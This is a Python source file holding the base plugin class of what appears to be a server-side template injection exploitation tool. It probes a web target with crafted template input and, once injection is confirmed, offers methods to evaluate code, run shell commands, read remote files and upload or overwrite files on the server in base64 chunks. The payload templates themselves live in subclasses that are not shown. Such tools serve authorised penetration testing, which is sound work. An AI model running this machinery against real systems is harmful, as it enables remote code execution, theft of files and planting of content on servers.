from utils.strings import quote, chunkit, md5
from utils import rand
from utils.loggers import log
import re
import itertools
import base64

class Plugin(object):

    def __init__(self, channel):

        # HTTP channel
        self.channel = channel

        # Plugin name
        self.plugin = self.__class__.__name__

    def detect(self):

        context_num = len([c for c in self.contexts if (c.get('level') <= self.channel.args.get('level'))])

        # Start detection
        self._detect_render()

        # If render_fmt is not set, check unreliable render
        if self.get('render_fmt') == None:
            self._detect_unreliable_render()

            # Return if unreliable is set
            if self.get('unreliable'):
                return

        # If here, the rendering is confirmed
        prefix = self.get('prefix', '')
        render_fmt = self.get('render_fmt', '%(payload)s') % ({'payload' : '*' })
        suffix = self.get('suffix', '')
        log.info('%s plugin has confirmed injection with tag \'%s%s%s\'' % (
            self.plugin,
            repr(prefix).strip("'"),
            repr(render_fmt).strip("'"),
            repr(suffix).strip("'"),
            )
        )

        self.detect_engine()

        # Return if engine is still unset
        if not self.get('engine'):
            return

        self.detect_eval()
        self.detect_exec()
        self.detect_write()
        self.detect_read()


    def _generate_contexts(self):

        # Loop all the contexts
        for ctx in self.contexts:

            # If --force-level skip any other level
            force_level = self.channel.args.get('force_level')
            if force_level and force_level[0] and ctx.get('level') != int(force_level[0]):
                continue
            # Skip any context which is above the required level
            if not force_level and ctx.get('level') > self.channel.args.get('level'):
                continue

            # The suffix is fixed
            suffix = ctx.get('suffix', '') % ()

            # If the context has no closures, generate one closure with a zero-length string
            if ctx.get('closures'):
                closures = self._generate_closures(ctx)
            else:
                closures = [ '' ]

            log.info('%s plugin is testing %s*%s code context escape with %i variations%s' % (
                            self.plugin,
                            repr(ctx.get('prefix', '%(closure)s') % ( { 'closure' : '' } )).strip("'"),
                            repr(suffix).strip("'"),
                            len(closures),
                            ' (level %i)' % (ctx.get('level', 1)) if self.get('level') else ''
                    )
            )

            for closure in closures:

                # Format the prefix with closure
                prefix = ctx.get('prefix', '%(closure)s') % ( { 'closure' : closure } )

                yield prefix, suffix

    """
    Detection of unreliabe rendering tag with no header and trailer.
    """
    def _detect_unreliable_render(self):

        render_action = self.actions.get('render')
        if not render_action:
            return

        # Print what it's going to be tested
        log.info('%s plugin is testing unreliable rendering on text context with tag %s' % (
                self.plugin,
                repr(render_action.get('payload') % ({'payload' : '*' })).strip("'"),
            )
        )

        # Prepare base operation to be evalued server-side
        randA = rand.randint_n(1)
        randB = rand.randint_n(1)
        expected = str(randA*randB)
        payload = render_action.get('payload') % ({ 'payload': '%s*%s' % (randA, randB) })

        # First probe with payload wrapped by header and trailer, no suffex or prefix
        if expected == self.inject(
                payload = payload,
                header = '',
                trailer = '',
                header_rand = None,
                trailer_rand = None,
                prefix = '',
                suffix = ''
            ):

            self.set('render_fmt', render_action.get('payload'))

            # Print if the first found unreliable render
            if not self.get('unreliable'):
                log.info('%s plugin has detected unreliable rendering with tag %s, skipping' % (
                    self.plugin,
                    repr(self.get('render_fmt') % ({'payload' : '*' })).strip("'"))
                )

            self.set('unreliable', self.plugin)
            return

    """
    Detection of the rendering tag and context.
    """
    def _detect_render(self):

        render_action = self.actions.get('render')
        if not render_action:
            return

        # Print what it's going to be tested
        log.info('%s plugin is testing rendering with tag %s' % (
                self.plugin,
                repr(render_action.get('payload') % ({'payload' : '*' })).strip("'"),
            )
        )

        for prefix, suffix in self._generate_contexts():

            # Prepare base operation to be evalued server-side
            randA = rand.randint_n(1)
            randB = rand.randint_n(1)
            expected = str(randA*randB)

            payload = render_action.get('payload') % ({ 'payload': '%s*%s' % (randA, randB) })
            header_rand = rand.randint_n(10)
            header = render_action.get('header') % ({ 'header' : header_rand })
            trailer_rand = rand.randint_n(10)
            trailer = render_action.get('trailer') % ({ 'trailer' : trailer_rand })

            # First probe with payload wrapped by header and trailer, no suffex or prefix
            if expected == self.inject(
                    payload = payload,
                    header = header,
                    trailer = trailer,
                    header_rand = header_rand,
                    trailer_rand = trailer_rand,
                    prefix = prefix,
                    suffix = suffix
                ):

                self.set('render_fmt', render_action.get('payload'))
                self.set('header_fmt', render_action.get('header'))
                self.set('trailer_fmt', render_action.get('trailer'))
                self.set('prefix', prefix)
                self.set('suffix', suffix)
                return


    """
    Detect engine and language used.
    """
    def detect_engine(self):
        pass

    """
    Detect code evaluation
    """
    def detect_eval(self):
        pass

    """
    Detect shell command execution
    """
    def detect_exec(self):
        pass

    """
    Inject shell commands
    """
    def execute(self, code):
        pass

    """
    Inject the payload.

    All the passed parameter must be already rendered. The parameters which are not passed, will be
    picked from self.channel.data dictionary and rendered at the moment.
    """
    def inject(self, payload, header = None, header_rand = None, trailer = None, trailer_rand = None, prefix = None, suffix = None):

        header_rand = rand.randint_n(10) if header_rand == None else header_rand
        header = self.get('header_fmt', '%(header)s') % ({ 'header' : header_rand }) if header == None else header

        trailer_rand = rand.randint_n(10) if trailer_rand == None else trailer_rand
        trailer = self.get('trailer_fmt', '%(trailer)s') % ({ 'trailer' : trailer_rand }) if trailer == None else trailer

        prefix = self.get('prefix', '') if prefix == None else prefix
        suffix = self.get('suffix', '') if suffix == None else suffix

        injection = prefix + header + payload + trailer + suffix
        log.debug('[request %s] %s' % (self.plugin, repr(self.channel.url)))

        result_raw = self.channel.req(injection)
        result = None

        # Return result_raw if header and trailer are not specified
        if not header and not trailer:
            return result_raw

        # Cut the result using the header and trailer if specified
        if header:
            before,_,result_after = result_raw.partition(str(header_rand))
        if trailer and result_after:
            result,_,after = result_after.partition(str(trailer_rand))

        return result.strip() if result else result

    def set(self, key, value):
        self.channel.data[key] = value

    def get(self, key, default = None):
        return self.channel.data.get(key, default)

    def _generate_closures(self, ctx):

        closures_dict = ctx.get('closures', { '0' : [] })

        closures = [ ]

        # Loop all the closure names
        for ctx_closure_level, ctx_closure_matrix in closures_dict.items():

            # If --force-level skip any other level
            force_level = self.channel.args.get('force_level')
            if force_level and force_level[1] and ctx_closure_level != int(force_level[1]):
                continue

            # Skip any closure list which is above the required level
            if not force_level and ctx_closure_level > self.channel.args.get('level'):
                continue

            closures += [ ''.join(x) for x in itertools.product(*ctx_closure_matrix) ]

        closures = sorted(set(closures), key=len)

        # Return it
        return closures


    """ Overridable function to get MD5 hash of remote files. """
    def md5(self, remote_path):

        action = self.actions.get('md5', {})
        payload = action.get('md5')
        call_name = action.get('call', 'inject')

        # Skip if something is missing or call function is not set
        if not action or not payload or not call_name or not hasattr(self, call_name):
            return

        execution_code = payload % ({ 'path' : remote_path })

        return getattr(self, call_name)(execution_code)

    """ Overridable function to detect read capabilities. """
    def detect_read(self):

        # Assume read capabilities only if evaluation
        # has been alredy detected and if self.actions['read'] exits
        if not self.get('eval') or not self.actions.get('read'):
            return

        self.set('read', True)

    """ Overridable function to read remote files. """
    def read(self, remote_path):

        action = self.actions.get('read', {})
        payload = action.get('read')
        call_name = action.get('call', 'inject')

        # Skip if something is missing or call function is not set
        if not action or not payload or not call_name or not hasattr(self, call_name):
            return

        # Get remote file md5
        md5_remote = self.md5(remote_path)

        if not md5_remote:
            log.warn('Error getting remote file md5, check presence and permission')
            return

        execution_code = payload % ({ 'path' : remote_path })

        data_b64encoded = getattr(self, call_name)(execution_code)
        data = base64.b64decode(data_b64encoded)

        if not md5(data) == md5_remote:
            log.warn('Remote file md5 mismatch, check manually')
        else:
            log.info('File downloaded correctly')

        return data

    def detect_write(self):

        # Assume write capabilities only if evaluation
        # has been alredy detected and if self.actions['write'] exits
        if not self.get('eval') or not self.actions.get('write'):
            return

        self.set('write', True)

    def write(self, data, remote_path):

        action = self.actions.get('write', {})
        payload_write = action.get('write')
        payload_truncate = action.get('truncate')
        call_name = action.get('call', 'inject')

        # Skip if something is missing or call function is not set
        if not action or not payload_write or not payload_truncate or not call_name or not hasattr(self, call_name):
            return

        # Check existance and overwrite with --force-overwrite
        if self.md5(remote_path):
            if not self.channel.args.get('force_overwrite'):
                log.warn('Remote path already exists, use --force-overwrite for overwrite')
                return
            else:
                execution_code = payload_truncate % ({ 'path' : remote_path })
                getattr(self, call_name)(execution_code)

        # Upload file in chunks of 500 characters
        for chunk in chunkit(data, 500):

            chunk_b64 = base64.urlsafe_b64encode(chunk)

            execution_code = payload_write % ({ 'path' : remote_path, 'chunk' : chunk_b64 })
            getattr(self, call_name)(execution_code)

        if not md5(data) == self.md5(remote_path):
            log.warn('Remote file md5 mismatch, check manually')
        else:
            log.warn('File uploaded correctly')


    def evaluate(self, code):

        action = self.actions.get('evaluate', {})
        payload = action.get('evaluate')
        call_name = action.get('call', 'inject')

        # Skip if something is missing or call function is not set
        if not action or not payload or not call_name or not hasattr(self, call_name):
            return

        execution_code = payload % ({ 'code' : code })

        return getattr(self, call_name)(execution_code)

    def detect_exec(self):

        expected_rand = str(rand.randint_n(2))

        if expected_rand == self.execute('echo %s' % expected_rand):
            self.set('exec', True)

    def execute(self, code):

        action = self.actions.get('execute', {})
        payload = action.get('execute')
        call_name = action.get('call', 'inject')

        # Skip if something is missing or call function is not set
        if not action or not payload or not call_name or not hasattr(self, call_name):
            return

        execution_code = payload % ({ 'code' : code })
        return getattr(self, call_name)(execution_code)
